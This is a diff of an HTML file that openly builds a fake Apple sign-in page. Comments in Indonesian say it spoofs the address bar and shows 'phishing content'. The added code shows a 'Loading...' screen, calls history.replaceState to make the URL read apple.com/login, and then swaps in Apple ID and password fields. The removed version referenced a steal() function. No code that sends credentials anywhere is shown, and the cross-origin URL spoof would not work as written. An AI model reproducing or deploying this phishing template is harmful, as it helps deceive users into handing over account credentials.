@@ -1,48 +1,44 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Verifying identity...</title>
+  <title>Loading...</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1">
   <style>
     html, body {
-      margin: 0; padding: 0;
-      font-family: sans-serif;
-      background: white;
+      margin: 0;
+      background: #f9f9f9;
+      font-family: -apple-system, sans-serif;
     }
-    .spoof {
-      position: absolute;
-      top: 30vh;
-      width: 100%;
-      text-align: center;
-    }
-    input {
-      padding: 10px;
-      font-size: 16px;
-      width: 80%;
-      max-width: 400px;
-    }
-    button {
-      margin-top: 10px;
-      padding: 10px 20px;
-      font-size: 16px;
+    .center {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      flex-direction: column;
     }
   </style>
 </head>
 <body>
+  <div class="center">
+    <h2>Loading...</h2>
+    <p>Please wait while we connect to your account.</p>
+  </div>
 
-<div class="spoof">
-  <h2>🔒 Sign in to Apple</h2>
-  <p>Enter your Apple ID password to continue</p>
-  <input type="password" placeholder="••••••••">
-  <br>
-  <button onclick="steal()">Continue</button>
-</div>
+  <script>
+    // Ganti URL yang tampil di bilah alamat
+    history.replaceState({}, "", "https://apple.com/login");
 
-<script>
-setTimeout(() => {
-  // Make it look like the user is on https://apple.com
-  history.replaceState({}, "", "https://apple.com/login");
-}, 200);
-</script>
-
+    // Tampilkan konten phishing
+    setTimeout(() => {
+      document.body.innerHTML = `
+        <div class="center">
+          <h2>🔒 Sign in to Apple</h2>
+          <input placeholder="Apple ID" /><br><br>
+          <input placeholder="Password" type="password" /><br><br>
+          <button>Continue</button>
+        </div>
+      `;
+    }, 1500);
+  </script>
 </body>
 </html>
